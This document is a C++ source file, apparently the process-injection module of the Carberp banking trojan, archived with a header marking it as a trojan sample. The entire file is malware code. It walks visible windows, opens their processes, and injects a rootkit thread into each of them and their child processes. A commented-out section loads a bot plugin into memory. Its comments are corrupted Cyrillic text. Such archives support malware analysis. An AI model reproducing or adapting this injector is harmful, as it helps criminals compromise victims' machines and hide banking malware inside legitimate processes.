/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------

#pragma hdrstop

#include <Windows.h>
#include <tlhelp32.h>

#include "AppInjector.h"
#include "BotCore.h"
#include "Inject.h"
#include "Utils.h"
#include "Installer.h"
#include "DLLLoader.h"
#include "ntdll.h"
#include "Rootkit.h"
#include "BotUtils.h"
//---------------------------------------------------------------------------


#include "BotDebug.h"

namespace INJECTORRDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define INJKDBG INJECTORRDEBUGSTRINGS::DBGOutMessage<>

//---------------------------------------------------------------------------

namespace INJECTOR
{
	typedef struct TInjector
	{
		bool      IsWin64;     // ������� ����, ��� ������� �������� � 64 ������ ����
		TBotList* Injected;    // ������ ���������, � ������� ��� �������� ������
		LPBYTE    NameBuf;     // ����� ��������� ����� ��� ��������
		DWORD     NameBufSize; // ������ ������ ��������� ����� ��� ��������

		TInjectFunction InjectFunction; // ��������� �� ���������� �������
	} *PInjector;

	typedef struct TProcessInfo
	{
		DWORD    PID;
		BOOL     IsWOW64;
		wstring  ExeName;
	} *PProcessInfo;

	typedef struct TInjectItem
	{
		DWORD NameHash;
		DWORD PID;
	} *PInjectItem;

	DWORD WINAPI InjectorProc(LPVOID);
	BOOL CALLBACK WndEnumCallBak(HWND Wnd, LPARAM Param);
	bool GetProcessInfo(PInjector Injector, DWORD PID, TProcessInfo &Info);
	bool Inject(PInjector Injector, PProcessInfo Info);
	void InjectInChildProcesses(PInjector Injector, PProcessInfo Parent);
}


//------------------------------------------------------
//  StartInjector - ������� �������� ������� ���������
//------------------------------------------------------
BOOL WINAPI StartInjector()
{
	INJKDBG("INJECTOR", "�������� ��������");
	#ifdef AGENTFULLTEST
		return StartThread(INJECTOR::InjectorProc, NULL) != NULL;
	#else
		return MegaJump(INJECTOR::InjectorProc);
	#endif
}



//------------------------------------------------------
//  InjectorProc - �������� ������� ���������, �������
//                 ��������� ��������� ���������� ��������
//------------------------------------------------------
DWORD WINAPI INJECTOR::InjectorProc(LPVOID)
{
	// �������� ������ ���������:
	// ���������� ��� ��� �������� ����� � ����������
	// � ������ ���������
	BOT::Initialize();

	INJKDBG("INJECTOR", "������� ������� ��������");

	TInjector Injector;
	Injector.IsWin64  = IsWIN64();
	Injector.Injected = new TBotList();
	Injector.NameBufSize = 1024;
	Injector.NameBuf = (LPBYTE)MemAlloc(Injector.NameBufSize);

	// ��� ������ ���������� �������� ������� �������
	Injector.InjectFunction = RootkitThread;

	/*
	// ��������� ������
	INJKDBG("INJECTOR", "��������� bot.plug");
	for (int i = 0; i < 2; i++)
	{
		LPVOID Plug = NULL;
		LPVOID PlugHandle = NULL;
		if (LoadBotPlug(&Plug, NULL))
		{
			PlugHandle = MemoryLoadLibrary(Plug, false);
			Injector.InjectFunction = (TInjectFunction)MemoryGetProcAddress(PlugHandle, START_PROC_HASH);
			FreeBotPlug(Plug);
		}
		if (Injector.InjectFunction) break;




		// � ������ ������ ��������� ������ �������
		// ������������� ��������� ������
		MemoryFreeLibrary(PlugHandle);
		UpdateBotPlug();
	}

	if (!Injector.InjectFunction) pExitProcess(0); */


    INJKDBG("INJECTOR", "��������");

	while (!BOT::Terminated())
	{
		// ���������� ������� ���� ����
		pEnumWindows(WndEnumCallBak, &Injector);
		pSleep(500);
	}

	// ��� ���������� ������ ������� �� ��������
	pExitProcess(0);
	return 0;
}

//------------------------------------------------------
// GetProcessInfo - ������� ������� ���������� � �������
//------------------------------------------------------
bool INJECTOR::GetProcessInfo(PInjector Injector, DWORD PID, TProcessInfo &Info)
{
	ClearStruct(Info);
	Info.PID = PID;
	// ��������� �������
	CLIENT_ID ClientID;
	ClientID.UniqueProcess = (HANDLE)PID;
	ClientID.UniqueThread  = 0;

	OBJECT_ATTRIBUTES ObjectAttributes = { sizeof(ObjectAttributes) } ;

	HANDLE Process;
	if (pZwOpenProcess(&Process,  PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, &ObjectAttributes, &ClientID) != STATUS_SUCCESS)
		return false;

	// ���������� �� ������� �������
	pIsWow64Process(Process, &Info.IsWOW64);

	if (Injector->IsWin64 && !Info.IsWOW64)
		return false;

	// �������� ��� ��������
	PUNICODE_STRING Str = (PUNICODE_STRING)Injector->NameBuf;
	Str->Length = 0;
	Str->MaximumLength = Injector->NameBufSize - sizeof(UNICODE_STRING);
	Str->Buffer        = (PWSTR)(Injector->NameBuf + sizeof(UNICODE_STRING));
	ULONG Len = Str->MaximumLength;

	if(pZwQueryInformationProcess(Process, ProcessImageFileName, Str, Len, &Len) == STATUS_SUCCESS)
	{
		// ������� �������� ��� ��������
		Info.ExeName = Str->Buffer;
	}


	// ��������� �������
	pZwClose(Process);
    return true;
}


//------------------------------------------------------
//  WndEnumCallBak - ������� ��������� ���������� ����
//------------------------------------------------------
BOOL CALLBACK INJECTOR::WndEnumCallBak(HWND Wnd, LPARAM Param)
{
	// ���� ������ ���� ������� � �� ����� ���������
	if (pIsWindowVisible(Wnd) && !pGetWindow(Wnd, GW_OWNER))
	{
		// �������� ��� ������ �������� ����������� ����
		DWORD PID = 0;
		pGetWindowThreadProcessId(Wnd, &PID);
		if (PID)
		{
			PInjector Injector = (PInjector)Param;


			TProcessInfo Info;
			if (GetProcessInfo(Injector, PID, Info))
			{
				// ��������� ������������� �������
				// ��������� ������ � 32 ��������� ����� ��� � 32 ��������� ��������
				Inject(Injector, &Info);
			}

		}
    }

	return TRUE;
}


void INJECTOR::InjectInChildProcesses(PInjector Injector, PProcessInfo Parent)
{
	// ������� ���������� � �������� ��������
	// � ����������� �������� ������ ������������ ���������
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(pe);
	HANDLE Snap = (HANDLE)pCreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0);
	if (Snap != INVALID_HANDLE_VALUE)
	{
		if (pProcess32First(Snap, &pe))
		{
			do
			{
				if (pe.th32ParentProcessID == Parent->PID)
				{
					TProcessInfo Info;
					if (GetProcessInfo(Injector, pe.th32ProcessID, Info))
						Inject(Injector, &Info);
				}

			} while( pProcess32Next(Snap, &pe ) );
		}
		pCloseHandle(Snap);
    }
 }


//------------------------------------------------------
// Inject - ������� ������������ ������ � �������� �������
//------------------------------------------------------
bool INJECTOR::Inject(PInjector Injector, PProcessInfo Info)
{
	DWORD Hash = Info->ExeName.Hash();
	// ��������� �� ����������� �� � ������ �������
	for (int i = 0; i < Injector->Injected->Count(); i++)
	{
		PInjectItem Item = (PInjectItem)Injector->Injected->GetItem(i);
		if (Item->PID == Info->PID && Item->NameHash == Hash)
		{
			// ��� ��������� ������� ������� ������������� � �������� ��������.
			// ������� � ���, ��� ��������� ��������� ������� ���� �������� �
			// ��� ��������� ������� ������� ��� �������� ��������.
			// � ��������� ����� ��������� �������� �� Internet Explorer
			InjectInChildProcesses(Injector, Info);

			return false;
        }
	}

	if (!BOT::ProcessInfected(Info->PID))
	{
		#ifndef AGENTFULLTEST
			BOOL Injected = InjectIntoProcess2(Info->PID, Injector->InjectFunction);
			INJKDBG("INJECTOR", "������: Result=%d App=%S", Injected, Info->ExeName.t_str());
		#else
			BOOL Injected = TRUE;
		#endif
    }

	// ��������� ����������
	PInjectItem Item = CreateStruct(TInjectItem);
	Item->PID = Info->PID;
	Item->NameHash = Hash;
	Injector->Injected->Add(Item);
	return true;
}
